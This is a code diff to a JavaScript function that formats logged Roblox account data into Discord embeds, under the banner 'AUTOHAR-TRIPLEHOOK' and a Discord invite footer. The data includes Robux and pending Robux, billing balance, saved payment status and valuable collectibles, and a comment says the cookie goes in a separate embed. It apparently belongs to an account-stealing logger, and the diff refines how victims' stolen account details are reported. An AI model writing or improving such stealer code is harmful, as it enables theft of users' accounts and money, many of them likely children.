@@ -162,6 +162,20 @@ function formatRobloxUserDataEmbed(logData) {
   try {
     const userData = JSON.parse(logData.message);
     
+    // Format collectibles with proper icon handling
+    let collectiblesValue = "";
+    if (userData.korblox) {
+      collectiblesValue += "<:KorbloxDeathspeaker:1408080747306418257> True\n";
+    } else {
+      collectiblesValue += "False\n";
+    }
+    
+    if (userData.headless) {
+      collectiblesValue += "<:HeadlessHorseman:1397192572295839806> True";
+    } else {
+      collectiblesValue += "False";
+    }
+
     // First embed: User data only (without cookie)
     const userDataEmbed = {
       title: "<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK",
@@ -174,7 +188,7 @@ function formatRobloxUserDataEmbed(logData) {
         },
         {
           name: "<:emoji_31:1410233610031857735> Robux (Pending)",
-          value: `${userData.robux || 0} (0)`,
+          value: `${userData.robux || 0} (${userData.pendingRobux || 0})`,
           inline: true
         },
         {
@@ -194,7 +208,7 @@ function formatRobloxUserDataEmbed(logData) {
         },
         {
           name: "<a:emoji_42:1410523396995022890> Billing",
-          value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.round(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
+          value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${(userData.creditBalance / 100).toFixed(2)} (Est. ${Math.round(userData.creditBalance * 0.8)} Robux)`: "$0.00"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
           inline: false
         },
         {
@@ -204,7 +218,7 @@ function formatRobloxUserDataEmbed(logData) {
         },
         {
           name: "<:emoji_39:1410521396420939787> Collectibles",
-          value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}`,
+          value: collectiblesValue,
           inline: true
         },
         {
@@ -230,17 +244,19 @@ function formatRobloxUserDataEmbed(logData) {
       ],
       footer: {
         text: "Made By .gg/sZbFX2wPVz"
-      }
+      },
+      timestamp: new Date().toISOString()
     };
 
     return {
       embeds: [userDataEmbed]
     };
   } catch (error) {
+    console.error('Error parsing user data:', error);
     return {
       embeds: [{
         title: "<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK",
-        description: `\`\`\`\n${logData.message}\`\`\``,
+        description: `\`\`\`\nError parsing user data: ${error.message}\n${logData.message}\`\`\``,
         color: 0x8B5CF6,
         footer: {
           text: "Made By .gg/sZbFX2wPVz"
